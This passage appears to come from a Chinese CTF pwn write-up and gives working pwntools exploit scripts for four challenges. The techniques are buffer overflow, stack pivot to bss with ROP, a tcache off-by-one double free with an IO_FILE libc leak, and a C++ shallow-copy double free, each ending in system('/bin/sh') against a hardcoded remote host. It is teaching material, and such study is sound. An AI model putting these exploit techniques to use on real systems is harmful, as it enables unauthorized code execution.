    python
    #!/usr/bin/python
    from pwn import *
    context.log_level='debug'
    #p = process('./backdoor_for_jianjian')
    p = remote('121.41.13.20','32773')
    #gdb.attach(p,'b *0x40086F')
    p.recvuntil('(y/n)')
    p.send('a'*108+p32(0x8180754))
    p.recvuntil('required!')
    p.send(p64(0))
    p.recvuntil('success!')
    p.sendline('a'*0x18+p64(0x4007C3))
    p.interactive()
###  suggestion_box
考点：栈迁移
分析：
1.第一次输入在 bss 中布置好泄露地址和 getshell 的 rop 链
2.第二次输入劫持返回地址后用两个 `leave ret` “ 把栈迁移到 bss 段
exp:
    python
    #!/usr/bin/python 
    from pwn import * 
    from LibcSearcher import * 
    context.log_level='debug' 
    #p = process('./suggestion_box') 
    p = remote('121.41.13.20',32775) 
    elf = ELF('./suggestion_box') 
    libc=ELF("./libc-2.23.so") 
    #gdb.attach(p,'b *0x400707') 
    pop_rdi = 0x400783 
    puts=elf.plt['puts'] 
    puts_got=elf.got['puts'] 
    read = 0x400682 
    leave = 0x40069c 
    p.recvuntil('suggestions:') 
    p.send('a'*8*10+p64(0x602040+80)+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(read)) 
    p.recvuntil('.\n') 
    p.send('\x01'*0x10+p64(0x602040+80)+p64(leave)) 
    puts=u64(p.recv(6).ljust(8,'\x00')) 
    print hex(puts) 
    libcbase=puts-libc.sym['puts'] 
    system_addr=libcbase+libc.sym['system'] 
    bin_sh=libcbase+libc.search("/bin/sh\x00").next() 
    p.send('a'*8*10+p64(0x602040+100)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)) 
    p.interactive()
###  BabyTcache
考点：
Tcache、构造重叠的堆块、利用 IO_FILE 结构体泄露 libc
分析：
1.利用改写 IO_write_base 泄露 libc
2.利用程序中的 Off by one 漏洞实现 double free
3.可以通过申请 7 个以上的 chunk 或者改写 chunk size 绕过程序对申请 chunk 大小的限制
exp：
    from pwn import * 
    #from LibcSearcher import LibcSearcher 
    context(log_level='debug',arch='amd64') 
    local=0 
    binary_name='babytcache' 
    if local: 
        p=process("./"+binary_name) 
        e=ELF("./"+binary_name) 
        libc=e.libc 
    else: 
        p=remote("121.41.13.20",32772) 
        e=ELF("./"+binary_name) 
        libc=ELF("./libc-2.27.so") 
    def z(a=''): 
        if local: 
            gdb.attach(p,a) 
            if a=='': 
                raw_input 
        else: 
            pass 
    ru=lambda x:p.recvuntil(x) 
    sl=lambda x:p.sendline(x) 
    sd=lambda x:p.send(x) 
    sla=lambda a,b:p.sendlineafter(a,b) 
    ia=lambda :p.interactive() 
    def leak_address(): 
        if(context.arch=='i386'): 
            return u32(p.recv(4)) 
        else : 
            return u64(p.recv(6).ljust(8,'\x00')) 
    def add(len,data): 
        sla("Please input your choice:",'1') 
        sla("The length of your info:",str(len)) 
        ru("Data:") 
        sd(data) 
    def dele(idx): 
        sla("Please input your choice:",'2') 
        sla("Index:",str(idx)) 
    add(0x10,'a') 
    add(0x400,'a') 
    add(0x60,'a') 
    add(0x30,'a') 
    add(0x20,'a') 
    dele(0) 
    pd='a'*0x18+'\xc1' 
    add(0x18,pd) 
    dele(1) 
    dele(2) 
    dele(3) 
    add(0x400,'a') 
    pd='\x60\x97' 
    add(0x10,pd) 
    add(0x60,'a') 
    pd=p64(0xfbad1800)+p64(0)*3+'\x00' 
    add(0x60,pd) 
    p.recv(0x80) 
    leak_addr=leak_address() 
    libc_base=leak_addr-libc.sym['_IO_2_1_stderr_']-128 
    print hex(libc_base) 
    system=libc_base+libc.sym['system'] 
    free_hook=libc_base+libc.sym['__free_hook'] 
    add(0x20,'a') 
    pd='a'*0x20+p64(free_hook) 
    add(0x40,pd) 
    add(0x30,'/bin/sh\x00') 
    add(0x30,p64(system)) 
    dele(8) 
    p.interactive()
###  Containers
框架与 De1ctf 的 STL Containers 一样，漏洞是常见的 C++程序错误：含有指针类型的对象需要实现深拷贝函数和赋值运算符重载，否则在使用
STL 函数时实际上传递的只是指针，所指向的内存空间是相同的，就会造成 double free。在这道题的源码中没有实现赋值运算符重载函数，在 vector
的 add 操作中通过赋值运算后再传递给 push_back 函数。实际上，如果觉得
C++反汇编代码分析起来比较费时可以直接运行调试，不难发现这一点。接下来就是利用漏洞点，泄露地址后改写 free_hook 为 system 函数。
exp：
    from pwn import * 
    #from LibcSearcher import LibcSearcher 
    context(log_level='debug',arch='amd64') 
    local=0 
    binary_name='containers' 
    if local: 
        p=process("./"+binary_name) 
        e=ELF("./"+binary_name) 
        libc=e.libc 
    else: 
        p=remote("121.41.13.20",32774) 
        e=ELF("./"+binary_name) 
        libc=ELF("./libc-2.27.so") 
    def z(a=''): 
        if local: 
            gdb.attach(p,a) 
            if a=='': 
                raw_input 
        else: 
            pass 
    ru=lambda x:p.recvuntil(x) 
    sl=lambda x:p.sendline(x) 
    sd=lambda x:p.send(x) 
    sla=lambda a,b:p.sendlineafter(a,b) 
    ia=lambda :p.interactive() 
    def leak_address(): 
        if(context.arch=='i386'): 
            return u32(p.recv(4)) 
        else : 
            return u64(p.recv(6).ljust(8,'\x00')) 
    def add(container,data): 
        sla("Input your choice:",str(container)) 
        sla("Input your choice:",'1') 
        ru("input data:") 
        sd(data) 
    def dele(container): 
        sla("Input your choice:",str(container)) 
        sla("Input your choice:",'2') 
    def dele2(container,idx): 
        sla("Input your choice:",str(container)) 
        sla("Input your choice:",'2') 
        sla("Index:",str(idx)) 
    def show(container,idx): 
        sla("Input your choice:",str(container)) 
        sla("Input your choice:",'3') 
        sla("Index:",str(idx)) 
    #z('b *(0x555555554000+0x20BB)\nb *(0x555555554000+0x1FD9)\nb *(0x555555554000+0x201B)') 
    add(1,'a') 
    add(1,'a') 
    add(3,'a') 
    add(3,'a') 
    add(4,'a') 
    add(4,'a') 
    dele2(1,0) 
    dele2(1,1) 
    dele(3) 
    dele(3) 
    dele(4) 
    dele(4) 
    add(2,'a') 
    dele(2) 
    add(2,'a') 
    dele(2) 
    add(1,'a') 
    dele2(1,0) 
    add(2,'a') 
    dele(2) 
    show(1,0) 
    leak_addr=leak_address() 
    libc_base=leak_addr-libc.sym['__malloc_hook']-96-0x10 
    print hex(libc_base) 
    free_hook=libc_base+libc.sym['__free_hook'] 
    system=libc_base+libc.sym['system'] 
    add(4,p64(free_hook)) 
    add(3,p64(system)) 
    add(4,'/bin/sh\x00') 
    p.interactive()